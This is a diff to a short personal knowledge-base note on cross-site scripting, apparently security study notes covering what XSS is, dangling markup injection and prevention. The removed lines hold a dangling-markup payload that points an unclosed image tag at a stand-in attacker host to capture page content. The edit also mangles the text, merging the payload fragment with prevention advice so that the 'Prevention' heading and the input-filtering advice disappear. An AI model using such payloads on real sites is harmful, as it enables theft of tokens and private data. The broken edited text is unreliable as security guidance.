@@ -1,6 +1,12 @@
 ---
+title: XSS
 tags: [misc]
+type: document
+source: 11_KNOWLEDGE/misc
 ---
+
+
+
 # XSS
 What is it?
 * Attacker compromises interactions user has with vulnerable application
@@ -37,11 +43,7 @@ Dangling Markup Injection
    	* Often due to input filters
 * Can capture sensitive info (including CSRF, which can be used to perform unauthorised actions on a users behalf)
 * It's when you enter an unclosed tag, like:
-   	* "><img src='//attacker-website.com?        
-
-Prevention
-* Filter/validate input on arrival
-* Encode data on output => HTML, URL, JS and CSS encoding
+   	* "> HTML, URL, JS and CSS encoding
 * Use appropriate response headers
    	* Use content-type and X-content-type-options headers to ensure browsers interpret responses the way you intend
    	* CSP
@@ -51,4 +53,7 @@ Prevention
 * https://portswigger.net/web-security/cross-site-scripting/preventing
 
 ---
-**Related:** [[docs/moc/00-Home]] · [[docs/moc/06-Knowledge-Base-MOC]] · [[docs/brain/AMOS_Simulation_Kernel_v0_Math_Foundations]] · [[docs/brain/system_scan_agent]] · [[docs/brain/automation_profiles]]
+**Related:** [[00_HOME]] · [[KNOWLEDGE_MOC]] · [[AMOS_SIMULATION_KERNEL_V0_MATH_FOUNDATIONS]] · [[SYSTEM_SCAN_AGENT]] · [[AUTOMATION_PROFILES]]
+
+---
+**MOC:** [[MISC_MOC]]
